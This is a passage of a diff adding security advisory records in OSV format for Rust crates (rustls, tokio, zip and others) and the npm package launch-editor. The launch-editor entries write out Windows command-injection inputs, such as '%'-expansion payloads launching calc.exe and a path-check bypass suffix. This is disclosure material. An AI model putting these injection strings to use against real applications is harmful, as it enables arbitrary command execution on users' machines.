+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"
+        }
+      ]
+    },
+    {
+      "id": "RUSTSEC-2026-0349",
+      "summary": "Unauthenticated ServerHello can downgrade later connections to classical key exchange",
+      "details": "The client recorded the server-selected key exchange group for each server\nname when processing the ServerHello, before the server was authenticated.\nThis record is used to predict which key share to send in future ClientHellos\nto that server name.\n\nA network attacker can answer one connection attempt with a ServerHello\nselecting X25519, and then close the connection. Later ClientHellos for that\nname carry only an X25519 key share, while `supported_groups` still lists\nX25519MLKEM768 first. If the genuine server accepts that share rather than\nsending a HelloRetryRequest for its preferred hybrid group, the handshake\ncompletes with classical-only key exchange and no error. This persists for as\nlong as the entry stays in the client's session store.\n\nThe impact is loss of post-quantum confidentiality for affected connections\n(\"harvest now, decrypt later\"). There is no key compromise and no\nauthentication bypass.\n\nThe following are not affected:\n\n- connections to servers which send a HelloRetryRequest for their preferred group,\n- clients with resumption disabled (as nothing is stored), and\n- other server names.\n\nThis behaviour is discussed in\n[draft-ietf-tls-key-share-prediction](https://www.ietf.org/archive/id/draft-ietf-tls-key-share-prediction-01.html#name-security-considerations),\nso the practical impact depends largely on server policy.",
+      "aliases": [
+        "GHSA-w44r-93j7-qv28"
+      ],
+      "modified": "2026-10-14T13:30:02.475705129Z",
+      "published": "2026-10-14T12:00:00Z",
+      "database_specific": {
+        "license": "CC0-1.0"
+      },
+      "references": [
+        {
+          "type": "PACKAGE",
+          "url": "https://crates.io/crates/rustls"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://rustsec.org/advisories/RUSTSEC-2026-0349.html"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/rustls/rustls/pull/3355"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "rustls",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/rustls"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0.0.0-0"
+                },
+                {
+                  "fixed": "0.23.46"
+                }
+              ]
+            }
+          ],
+          "ecosystem_specific": {
+            "affects": {
+              "arch": [],
+              "os": [],
+              "functions": []
+            },
+            "affected_functions": null
+          },
+          "database_specific": {
+            "informational": null,
+            "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2026-0349.json",
+            "categories": [
+              "crypto-failure"
+            ],
+            "cvss": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N"
+          }
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N"
+        }
+      ]
+    },
+    {
+      "id": "RUSTSEC-2026-0382",
+      "summary": "Certificate verification may accept distrusted intermediates",
+      "details": "Affected versions may accept certificate paths containing distrusted emSign\nintermediate public keys when the configured trust anchors allow such paths.\nThe private keys corresponding to these intermediates are now well known.\n\nVersions 0.103.16 and 0.104.0-alpha.8 reject paths containing these public keys.",
+      "aliases": [
+        "CVE-2026-111943",
+        "GO-2026-6809",
+        "RUSTSEC-2026-0381",
+        "RUSTSEC-2026-0383"
+      ],
+      "modified": "2026-10-21T00:55:56.763143468Z",
+      "published": "2026-10-20T12:00:00Z",
+      "database_specific": {
+        "license": "CC0-1.0"
+      },
+      "references": [
+        {
+          "type": "PACKAGE",
+          "url": "https://crates.io/crates/rustls-webpki"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://rustsec.org/advisories/RUSTSEC-2026-0382.html"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/rustls/webpki/pull/546"
+        },
+        {
+          "type": "WEB",
+          "url": "https://emudhra.we-have-a-problem.com/"
+        },
+        {
+          "type": "WEB",
+          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=2083449"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "rustls-webpki",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/rustls-webpki"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0.0.0-0"
+                },
+                {
+                  "fixed": "0.103.16"
+                },
+                {
+                  "introduced": "0.104.0-alpha.1"
+                },
+                {
+                  "fixed": "0.104.0-alpha.8"
+                }
+              ]
+            }
+          ],
+          "ecosystem_specific": {
+            "affected_functions": null,
+            "affects": {
+              "os": [],
+              "functions": [],
+              "arch": []
+            }
+          },
+          "database_specific": {
+            "cvss": null,
+            "informational": null,
+            "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2026-0382.json",
+            "categories": [
+              "crypto-failure"
+            ]
+          }
+        }
+      ],
+      "schema_version": "1.9.0"
+    },
+    {
+      "id": "RUSTSEC-2026-0386",
+      "summary": "`AsyncFd::new` and related constructors violate I/O safety",
+      "details": "`tokio::io::unix::AsyncFd` provides safe constructors (`new`, `with_interest`, `try_new`, and `try_with_interest`) that accept any `T: AsRawFd` rather than requiring proof of ownership or validity of the file descriptor. Because `RawFd` implements `AsRawFd`, safe code can construct an `AsyncFd` from an arbitrary or closed file descriptor, or close/replace the underlying file descriptor while the `AsyncFd` is still alive.\n\nThis violates I/O safety in two ways:\n\n1. `AsyncFd<T>` implements `AsFd` for all `T: AsRawFd` by calling `BorrowedFd::borrow_raw(self.as_raw_fd())`, allowing safe code to obtain an arbitrary `BorrowedFd<'_>` without owning the file descriptor.\n2. Tokio's I/O driver stores a pointer to an internal allocation in the `epoll`/`kqueue` user data for registered file descriptors. If the underlying file descriptor is duplicated and then closed while an `AsyncFd` is alive, and the OS reuses that file descriptor number for a another IO resource on the same runtime, dropping the first `AsyncFd` deregisters the reused file descriptor number and frees the first while the original file description remains registered in `epoll`, leading to a use-after-free when a readiness event fires.\n\nStarting in Tokio 1.51.6, 1.53.3, and 1.54.0, `AsyncFd::new`, `AsyncFd::with_interest`, `AsyncFd::try_new`, and `AsyncFd::try_with_interest` are deprecated in favor of the `unsafe` constructors `AsyncFd::register` and `AsyncFd::register_with_interest`. Callers must ensure that the file descriptor remains valid, open, and unchanged for the lifetime of the `AsyncFd`.",
+      "modified": "2026-10-23T14:45:03.847864944Z",
+      "published": "2026-10-13T12:00:00Z",
+      "database_specific": {
+        "license": "CC0-1.0"
+      },
+      "references": [
+        {
+          "type": "PACKAGE",
+          "url": "https://crates.io/crates/tokio"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://rustsec.org/advisories/RUSTSEC-2026-0386.html"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/tokio-rs/tokio/pull/8587"
+        },
+        {
+          "type": "REPORT",
+          "url": "https://github.com/tokio-rs/tokio/issues/8538"
+        },
+        {
+          "type": "REPORT",
+          "url": "https://github.com/tokio-rs/tokio/issues/8539"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "tokio",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/tokio"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0.3.2"
+                },
+                {
+                  "fixed": "1.51.6"
+                },
+                {
+                  "introduced": "1.52.0"
+                },
+                {
+                  "fixed": "1.53.3"
+                }
+              ]
+            }
+          ],
+          "ecosystem_specific": {
+            "affected_functions": null,
+            "affects": {
+              "functions": [
+                "tokio::io::unix::AsyncFd::new",
+                "tokio::io::unix::AsyncFd::try_new",
+                "tokio::io::unix::AsyncFd::try_with_interest",
+                "tokio::io::unix::AsyncFd::with_interest"
+              ],
+              "arch": [],
+              "os": []
+            }
+          },
+          "database_specific": {
+            "categories": [
+              "memory-corruption"
+            ],
+            "cvss": null,
+            "informational": "unsound",
+            "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2026-0386.json"
+          }
+        }
+      ],
+      "schema_version": "1.9.0"
+    },
+    {
+      "id": "RUSTSEC-2026-0383",
+      "summary": "Bundled root certificates allow trust in distrusted emSign intermediates",
+      "details": "Affected versions include `emSign ECC Root CA - G3`, which can allow certificate\npaths through distrusted emSign intermediates.\n\nAffected versions may accept certificate paths containing distrusted emSign\nintermediate public keys. The private keys corresponding to these intermediates\nare now well known.\n\nVersion 1.0.10+ removes this root.\n\nVersion 0.26.11 is a compatibility wrapper that re-exports\n`parent::TLS_SERVER_ROOT_CERTS` from its `webpki-root-certs` 1.x dependency; it\ncontains no separate root certificate list. Its resolved 1.x dependency must be\nupdated to 1.0.10 or later.",
+      "aliases": [
+        "CVE-2026-111943",
+        "GO-2026-6809",
+        "RUSTSEC-2026-0381",
+        "RUSTSEC-2026-0382"
+      ],
+      "modified": "2026-10-21T06:30:02.691648061Z",
+      "published": "2026-10-19T12:00:00Z",
+      "database_specific": {
+        "license": "CC0-1.0"
+      },
+      "references": [
+        {
+          "type": "PACKAGE",
+          "url": "https://crates.io/crates/webpki-root-certs"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://rustsec.org/advisories/RUSTSEC-2026-0383.html"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/rustls/webpki-roots/pull/133"
+        },
+        {
+          "type": "WEB",
+          "url": "https://emudhra.we-have-a-problem.com/"
+        },
+        {
+          "type": "WEB",
+          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=2083449"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "webpki-root-certs",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/webpki-root-certs"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0.0.0-0"
+                },
+                {
+                  "fixed": "0.26.11"
+                },
+                {
+                  "introduced": "0.26.12-0"
+                },
+                {
+                  "fixed": "1.0.10"
+                }
+              ]
+            }
+          ],
+          "ecosystem_specific": {
+            "affects": {
+              "arch": [],
+              "os": [],
+              "functions": []
+            },
+            "affected_functions": null
+          },
+          "database_specific": {
+            "categories": [
+              "crypto-failure"
+            ],
+            "cvss": null,
+            "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2026-0383.json",
+            "informational": null
+          }
+        }
+      ],
+      "schema_version": "1.9.0"
+    },
+    {
+      "id": "RUSTSEC-2026-0371",
+      "summary": "`zbus_names` is unmaintained",
+      "details": "The `zbus_names` crate is no longer maintained as a standalone crate.\n\nIt has been merged into [`zbus`](https://crates.io/crates/zbus) starting with version `6.0.0`, as its `names` module.\n\nUsers should migrate to [`zbus`](https://crates.io/crates/zbus), with its default features disabled if they only need the D-Bus name types.",
+      "modified": "2026-10-17T15:30:02.407875527Z",
+      "published": "2026-10-16T12:00:00Z",
+      "database_specific": {
+        "license": "CC0-1.0"
+      },
+      "references": [
+        {
+          "type": "PACKAGE",
+          "url": "https://crates.io/crates/zbus_names"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://rustsec.org/advisories/RUSTSEC-2026-0371.html"
+        },
+        {
+          "type": "REPORT",
+          "url": "https://github.com/z-galaxy/zbus/issues/2043"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "zbus_names",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/zbus_names"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0.0.0-0"
+                }
+              ]
+            }
+          ],
+          "ecosystem_specific": {
+            "affected_functions": null,
+            "affects": {
+              "functions": [],
+              "arch": [],
+              "os": []
+            }
+          },
+          "database_specific": {
+            "cvss": null,
+            "informational": "unmaintained",
+            "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2026-0371.json",
+            "categories": []
+          }
+        }
+      ],
+      "schema_version": "1.9.0"
+    },
+    {
+      "id": "RUSTSEC-2026-0367",
+      "summary": " Insecure Preservation of SUID/SGID Bits during ZIP Extraction Leading to Potential Privilege Escalation",
+      "details": "The `zip` crate preserves privileged Unix permission bits (SUID, SGID, and sticky bits) from ZIP `external_attributes` during extraction, instead of masking them to safe permission bits. If a privileged process (for example, `root` in an installer, CI/CD pipeline, or container build) extracts an attacker-controlled ZIP archive using `ZipArchive::extract()` or the stream extraction API, files can be created as setuid-root or setgid. This behavior allows the creation of SUID/SGID files during extraction, which can lead to local privilege escalation depending on the execution environment.\n\nFor further details see: https://github.com/zip-rs/zip2/security/advisories/GHSA-vv5m-jxxh-4627",
+      "aliases": [
+        "GHSA-vv5m-jxxh-4627"
+      ],
+      "modified": "2026-10-16T23:30:02.392172556Z",
+      "published": "2026-10-09T12:00:00Z",
+      "database_specific": {
+        "license": "CC0-1.0"
+      },
+      "references": [
+        {
+          "type": "PACKAGE",
+          "url": "https://crates.io/crates/zip"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://rustsec.org/advisories/RUSTSEC-2026-0367.html"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "zip",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/zip"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0.0.0-0"
+                },
+                {
+                  "fixed": "9.0.0"
+                }
+              ]
+            }
+          ],
+          "ecosystem_specific": {
+            "affects": {
+              "arch": [],
+              "os": [],
+              "functions": []
+            },
+            "affected_functions": null
+          },
+          "database_specific": {
+            "categories": [
+              "privilege-escalation"
+            ],
+            "cvss": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H",
+            "informational": null,
+            "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2026-0367.json"
+          }
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H"
+        }
+      ]
+    },
+    {
+      "id": "RUSTSEC-2026-0368",
+      "summary": "zip: `ZipArchive::extract` creates symbolic links whose attacker-controlled targets are outside the destination directory",
+      "details": "In `zip` 9.0.0-pre2, `ZipArchive::extract` creates a symbolic link from an archive entry after validating only the output entry path. The link target bytes are passed directly to the platform symlink API, so a malicious archive can create an entry inside the destination that resolves to an attacker-chosen path outside it. This behavior was verified on macOS and Linux. On either platform, a subsequent application read or write through that extracted entry accesses the external target with the extracting process's permissions.\n\nFor further details see: https://github.com/zip-rs/zip2/security/advisories/GHSA-4v9h-p7m9-rh26",
+      "aliases": [
+        "GHSA-4v9h-p7m9-rh26"
+      ],
+      "modified": "2026-10-16T23:30:02.383750571Z",
+      "published": "2026-10-09T12:00:00Z",
+      "database_specific": {
+        "license": "CC0-1.0"
+      },
+      "references": [
+        {
+          "type": "PACKAGE",
+          "url": "https://crates.io/crates/zip"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://rustsec.org/advisories/RUSTSEC-2026-0368.html"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "zip",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/zip"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0.0.0-0"
+                },
+                {
+                  "fixed": "9.0.0"
+                }
+              ]
+            }
+          ],
+          "ecosystem_specific": {
+            "affected_functions": null,
+            "affects": {
+              "functions": [],
+              "arch": [],
+              "os": []
+            }
+          },
+          "database_specific": {
+            "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2026-0368.json",
+            "categories": [
+              "privilege-escalation"
+            ],
+            "cvss": null,
+            "informational": null
+          }
+        }
+      ],
+      "schema_version": "1.9.0"
+    },
+    {
+      "id": "RUSTSEC-2026-0369",
+      "summary": "ZipStreamReader::extract() and ZipArchive::extract() apply Unix permissions through symlinks without confining the target",
+      "details": "`ZipStreamReader::extract()` applies Unix permissions through extracted symlinks without validating the symlink target stays within the destination\n\nFor further details see: https://github.com/zip-rs/zip2/security/advisories/GHSA-4684-h2q9-2vcp",
+      "aliases": [
+        "GHSA-4684-h2q9-2vcp"
+      ],
+      "modified": "2026-10-16T23:30:02.387698467Z",
+      "published": "2026-10-10T12:00:00Z",
+      "database_specific": {
+        "license": "CC0-1.0"
+      },
+      "references": [
+        {
+          "type": "PACKAGE",
+          "url": "https://crates.io/crates/zip"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://rustsec.org/advisories/RUSTSEC-2026-0369.html"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "zip",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/zip"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0.0.0-0"
+                },
+                {
+                  "fixed": "9.0.0"
+                }
+              ]
+            }
+          ],
+          "ecosystem_specific": {
+            "affects": {
+              "arch": [],
+              "os": [],
+              "functions": []
+            },
+            "affected_functions": null
+          },
+          "database_specific": {
+            "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H",
+            "informational": null,
+            "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2026-0369.json",
+            "categories": [
+              "privilege-escalation"
+            ]
+          }
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H"
+        }
+      ]
+    },
+    {
+      "id": "RUSTSEC-2026-0370",
+      "summary": "`zvariant` is unmaintained",
+      "details": "The `zvariant` crate is no longer maintained as a standalone crate.\n\nIt has been merged into [`zbus`](https://crates.io/crates/zbus) starting with version `6.0.0`, as its `wire` module.\n\nUsers should migrate to [`zbus`](https://crates.io/crates/zbus), with its default features disabled if they only need the D-Bus wire format. Users of the GVariant format should migrate to [`zgvariant`](https://crates.io/crates/zgvariant).",
+      "modified": "2026-10-17T15:30:02.390032532Z",
+      "published": "2026-10-16T12:00:00Z",
+      "database_specific": {
+        "license": "CC0-1.0"
+      },
+      "references": [
+        {
+          "type": "PACKAGE",
+          "url": "https://crates.io/crates/zvariant"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://rustsec.org/advisories/RUSTSEC-2026-0370.html"
+        },
+        {
+          "type": "REPORT",
+          "url": "https://github.com/z-galaxy/zbus/issues/2043"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "zvariant",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/zvariant"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0.0.0-0"
+                }
+              ]
+            }
+          ],
+          "ecosystem_specific": {
+            "affected_functions": null,
+            "affects": {
+              "arch": [],
+              "os": [],
+              "functions": []
+            }
+          },
+          "database_specific": {
+            "informational": "unmaintained",
+            "categories": [],
+            "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2026-0370.json",
+            "cvss": null
+          }
+        }
+      ],
+      "schema_version": "1.9.0"
+    },
+    {
+      "id": "RUSTSEC-2026-0372",
+      "summary": "`zvariant_derive` is unmaintained",
+      "details": "The `zvariant_derive` crate is no longer maintained as a standalone crate.\n\nIts derive macros are provided by [`zbus`](https://crates.io/crates/zbus) starting with version `6.0.0`.\n\nUsers should migrate to [`zbus`](https://crates.io/crates/zbus), with its default features disabled if they only need the D-Bus wire format.",
+      "modified": "2026-10-17T15:30:02.394812511Z",
+      "published": "2026-10-16T12:00:00Z",
+      "database_specific": {
+        "license": "CC0-1.0"
+      },
+      "references": [
+        {
+          "type": "PACKAGE",
+          "url": "https://crates.io/crates/zvariant_derive"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://rustsec.org/advisories/RUSTSEC-2026-0372.html"
+        },
+        {
+          "type": "REPORT",
+          "url": "https://github.com/z-galaxy/zbus/issues/2043"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "zvariant_derive",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/zvariant_derive"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0.0.0-0"
+                }
+              ]
+            }
+          ],
+          "ecosystem_specific": {
+            "affects": {
+              "functions": [],
+              "arch": [],
+              "os": []
+            },
+            "affected_functions": null
+          },
+          "database_specific": {
+            "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2026-0372.json",
+            "informational": "unmaintained",
+            "categories": [],
+            "cvss": null
+          }
+        }
+      ],
+      "schema_version": "1.9.0"
+    },
+    {
+      "id": "GHSA-587h-7wmj-h5pm",
+      "summary": "launch-editor: `fs.existsSync()` existence check can be bypassed on Windows",
+      "details": "### Summary\n\n`launch-editor` checked `fs.existsSync(fileName)` before passing a supplied path to an editor command. On Windows, an attacker can bypass this check with a crafted path ending in `\\\\..:line:column`. This removes the requirement that the attacker be able to place a file with a malicious filename.\n\nCombined with the `%` escaping issue described in [GHSA-698v-4r3x-3vcv](https://github.com/vitejs/launch-editor/security/advisories/GHSA-698v-4r3x-3vcv), this bypass can lead to OS command injection when an attacker controls the file argument.\n\n### Impact\n\nOnly apps that runs on Windows is affected.\n\n### Details\n\nThe earlier advisory assumed that `fs.existsSync()` required an attacker-controlled filename to exist. This advisory covers a bypass of that requirement.\n\nA crafted value ending in `\\\\..:1:1` is interpreted differently by `launch-editor-middleware`, `launch-editor`, and Windows:\n\n1. `launch-editor-middleware` calls `path.resolve()` while the final path component is `..:1:1`, so it is not treated as a parent-directory component.\n2. `launch-editor` treats `:1:1` as a line-and-column suffix and removes it, leaving a path ending in `\\\\..`.\n3. On Windows, `fs.existsSync()` accepts the resulting path as the existing parent directory even though the attacker-controlled preceding component does not exist.\n4. Because the existence check passes, the crafted filename reaches the Windows shell command.",
+      "aliases": [
+        "CVE-2026-112942"
+      ],
+      "modified": "2026-10-20T20:00:04.608979840Z",
+      "published": "2026-10-20T19:48:25Z",
+      "database_specific": {
+        "nvd_published_at": "2026-10-20T15:17:17Z",
+        "cwe_ids": [
+          "CWE-77"
+        ],
+        "severity": "HIGH",
+        "github_reviewed": true,
+        "github_reviewed_at": "2026-10-20T19:48:25Z"
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/launch-editor/security/advisories/GHSA-587h-7wmj-h5pm"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-112942"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/launch-editor/commit/f13cd835d4b8e860b1d4d080ad8a490cc2463679"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/vitejs/launch-editor"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/launch-editor/releases/tag/v2.14.2"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "launch-editor",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/launch-editor"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "2.14.2"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 2.14.1",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-587h-7wmj-h5pm/GHSA-587h-7wmj-h5pm.json"
+          }
+        },
+        {
+          "package": {
+            "name": "vite",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/vite"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "8.3.0"
+                },
+                {
+                  "fixed": "8.3.3"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 8.3.2",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-587h-7wmj-h5pm/GHSA-587h-7wmj-h5pm.json"
+          }
+        },
+        {
+          "package": {
+            "name": "vite",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/vite"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "8.2.0"
+                },
+                {
+                  "fixed": "8.2.4"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 8.2.3",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-587h-7wmj-h5pm/GHSA-587h-7wmj-h5pm.json"
+          }
+        },
+        {
+          "package": {
+            "name": "vite",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/vite"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "8.0.0"
+                },
+                {
+                  "fixed": "8.1.6"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 8.1.5",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-587h-7wmj-h5pm/GHSA-587h-7wmj-h5pm.json"
+          }
+        },
+        {
+          "package": {
+            "name": "vite",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/vite"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "7.0.0"
+                },
+                {
+                  "fixed": "7.3.7"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-587h-7wmj-h5pm/GHSA-587h-7wmj-h5pm.json",
+            "last_known_affected_version_range": "<= 7.3.6"
+          }
+        },
+        {
+          "package": {
+            "name": "vite",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/vite"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "6.4.4"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 6.4.3",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-587h-7wmj-h5pm/GHSA-587h-7wmj-h5pm.json"
+          }
+        },
+        {
+          "package": {
+            "name": "vite-plus",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/vite-plus"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "1.1.0"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-587h-7wmj-h5pm/GHSA-587h-7wmj-h5pm.json",
+            "last_known_affected_version_range": "<= 1.0.0"
+          }
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-698v-4r3x-3vcv",
+      "summary": "launch-editor: escapeCmdArgs() omits % escaping on Windows",
+      "details": "### Summary\n\n`launch-editor` did not escape `%` on Windows when passing an argument to `cmd`. When an environment variable contained a malicious value, it was possible that that content to be executed.\n\n### Impact\n\nOnly apps that match all of the following conditions are affected:\n\n- The user uses Windows\n- An attacker can place a file with the malicious filename containing `&` or `%`\n- Either of\n  - An attacker can inject an environment variable with a malicious value\n  - An attacker can add a NTFS alternate data stream to the file placed\n\n### Details\n\nUnlike `.sh` files, `.bat` / `.cmd` files on Windows cannot be called directly using [`child_process.spawn`](https://nodejs.org/docs/latest-v24.x/api/child_process.html#child_processspawncommand-args-options) and requires passing them as an argument of `cmd.exe`. To do so, launch-editor escapes the arguments passed to `cmd.exe`. But `launch-editor` did not escape `%` which is used for environment variables.\n\nBecause `launch-editor` checks if the argument matches an existing filename, the attack requires the attacker to be able to place a file.\n\n- If the attacker can inject an environment variable as well, they can include the subcommand in the env variable (e.g. set ` &calc.exe ` to `%ENV%`) and call `launchEditor` with `something%ENV%`.\n- If the attacker can place a NTFS alternate data stream to the file (e.g. a NTFS alternate data stream named `~-38%calc.exe`), they can call `launchEditor` with `something %CMDCMDLINE:~-38%calc.exe`.\n- If the attacker can create a filename containing the `%CD%` and the subcommand (e.g. `&calc.exe `), they can call `launchEditor` with `./%CD%`",
+      "aliases": [
+        "CVE-2026-112943"
+      ],
+      "modified": "2026-10-20T18:45:09.467993691Z",
+      "published": "2026-10-20T18:30:24Z",
+      "database_specific": {
+        "github_reviewed": true,
+        "github_reviewed_at": "2026-10-20T18:30:24Z",
+        "nvd_published_at": "2026-10-20T15:17:17Z",
+        "cwe_ids": [
+          "CWE-78"
+        ],
+        "severity": "MODERATE"
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/launch-editor/security/advisories/GHSA-698v-4r3x-3vcv"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-112943"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/launch-editor/pull/155"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/launch-editor/commit/3c2f9bf2ff8fe63d056a8f9cc52d825b66ca79fc"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/vitejs/launch-editor"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/launch-editor/releases/tag/v2.14.2"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "launch-editor",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/launch-editor"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "2.14.2"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 2.14.1",
